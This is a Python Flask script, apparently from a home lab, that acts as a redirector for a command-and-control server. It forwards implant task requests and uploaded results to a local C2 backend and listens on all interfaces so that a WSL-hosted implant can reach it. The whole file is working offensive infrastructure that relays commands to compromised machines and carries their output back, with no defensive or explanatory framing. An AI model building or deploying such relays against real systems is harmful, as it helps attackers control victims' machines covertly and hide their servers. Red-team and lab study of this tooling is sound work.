# redirector.py
from flask import Flask, request, Response
import requests

app = Flask(__name__)

# Configuration
C2_SERVER_URL = "http://127.0.0.1:5000" # The "real" C2 server running locally

@app.route('/tasks/<implant_id>', methods=['GET'])
def get_task(implant_id):
    """Forward task request to the C2 server."""
    print(f"[Redirector] Forwarding task request for implant: {implant_id}")
    try:
        # Forward the GET request to the main C2
        resp = requests.get(f"{C2_SERVER_URL}/tasks/{implant_id}", headers={'X-Forwarded-For': request.remote_addr})
        return Response(resp.content, status=resp.status_code, content_type=resp.headers['content-type'])
    except requests.exceptions.RequestException as e:
        print(f"[Redirector] CRITICAL: Cannot connect to C2 server at {C2_SERVER_URL}. {e}")
        return "C2 server unreachable", 503

@app.route('/results', methods=['POST'])
def post_results():
    """Forward results to the C2 server."""
    data = request.get_json()
    print(f"[Redirector] Forwarding results from implant...")
    try:
        # Forward the POST request to the main C2
        resp = requests.post(f"{C2_SERVER_URL}/results", json=data)
        return Response(resp.content, status=resp.status_code)
    except requests.exceptions.RequestException as e:
        print(f"[Redirector] CRITICAL: Cannot connect to C2 server at {C2_SERVER_URL}. {e}")
        return "C2 server unreachable", 503

if __name__ == '__main__':
    # Listens on all interfaces (0.0.0.0) so the WSL implant can reach it.
    # The firewall rule on Windows must allow port 8080.
    print("[+] Redirector started. Listening on 0.0.0.0:8080...")
    print("[+] Forwarding all valid traffic to C2 server at " + C2_SERVER_URL)
    app.run(host='0.0.0.0', port=8080, debug=False)